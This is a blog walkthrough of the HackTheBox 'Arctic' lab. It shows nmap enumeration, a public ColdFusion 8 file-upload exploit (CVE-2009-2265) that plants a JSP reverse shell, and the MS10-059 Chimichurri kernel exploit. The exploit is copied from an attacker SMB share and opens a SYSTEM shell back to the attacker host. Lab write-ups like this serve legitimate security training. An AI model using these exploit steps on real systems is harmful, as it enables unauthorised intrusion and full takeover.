---
layout: post
title: HackTheBox Arctic 
date: 2017-03-22
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Arctic is fairly straightforward, however the load times on the web server pose a few challenges for exploitation. Basic troubleshooting is required to get the correct exploit functioning properly. ([Source](https://www.hackthebox.com/machines/arctic))

# Enumeration

```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.11
Nmap scan report for 10.10.10.11
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   173.13 ms 10.10.14.1
2   173.11 ms 10.10.10.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.50 seconds
```

It seems that there is a weird port `8500` open. Lets check it in our browser.

# Website (Port 8500)

![Port8500.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Arctic/Port8500.png?raw=true)

![Port8500_2.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Arctic/Port8500_2.png?raw=true)

![Port8500_3.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Arctic/Port8500_3.png?raw=true)

There's an interesting folder named `administrator` which presented us a ColdFusion 8 login page.

![Admin.png](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Arctic/Admin.png?raw=true)

# Vulnerabilities

Since we know that the website is using ColdFusion 8, we should search up some vulnerabilities on it using `searchsploit`.

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# searchsploit coldfusion
...
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting                   | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scriptin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting         | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting          | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                            | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                                  | windows/local/19220.c
Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                         | multiple/remote/19712.txt
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                              | cfm/webapps/16788.rb
...
```

The exploit that we are interested in is the `ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)` exploit. 

The vulnerability is [CVE-2009-2265](https://www.exploit-db.com/exploits/16788) and there is an exploit on this GitHub [repo](https://github.com/zaphoxx/zaphoxx-coldfusion).

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# python3 2265.py -t 10.10.10.11 -p 8500 -f shell.jsp
[info] Using following settings:
-----------------------------------
target    :          10.10.10.11
port      :                 8500
filepath  :            shell.jsp
basepath  :
-----------------------------------
[+] File successfully uploaded!
[+] Goto '/userfiles/file/TKVC4S.jsp' to trigger the payload!
[info] Make sure you have a listener active
[info] (e.g. nc -lvp 4444) before triggering the payload
```

After we have successfully run the script, we can `curl` the website to trigger the payload - remember to setup a netcat listener first!

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# curl 10.10.10.11:8500/userfiles/file/TKVC4S.jsp
```

```bash
┌──(shiro㉿Shiro)-[~]
└─$ nc -nlvp 1234
...

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis

C:\Users\tolis\Desktop>type user.txt
02650d3a69a70780c302e146a6cb96f3
```

# Privilege Escalation

```powershell
C:\ColdFusion8\runtime\bin>systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          23/5/2021, 6:17:36 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 360 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.213 MB
Virtual Memory: In Use:    834 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

Copy this `systeminfo` into a `txt` file and use Windows-Exploit-Suggester for help.

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# Windows-Exploit-Suggester/windows-exploit-suggester.py --update

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2021-05-23-mssb.xls --systeminfo sysinfo.txt
...
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
...
[*] done
```

MS10-059 sounds interesting because we want to escalate our privilege. The exploit can be found [here](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe). Let's open a smb server to share the exploit.

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# python3 /opt/impacket/examples/smbserver.py share .
```

```powershell
C:\ColdFusion8\runtime\bin>net use \\10.10.14.4\share
C:\ColdFusion8\runtime\bin>copy \\10.10.14.4\share\Chimichurri.exe
C:\ColdFusion8\runtime\bin>.\Chimichurri.exe 10.10.14.4 443
```

```powershell
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Arctic]
└─# nc -nvlp 443
...
C:\ColdFusion8\runtime\bin>whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
ce65ceee66b2b5ebaff07e50508ffb90
```

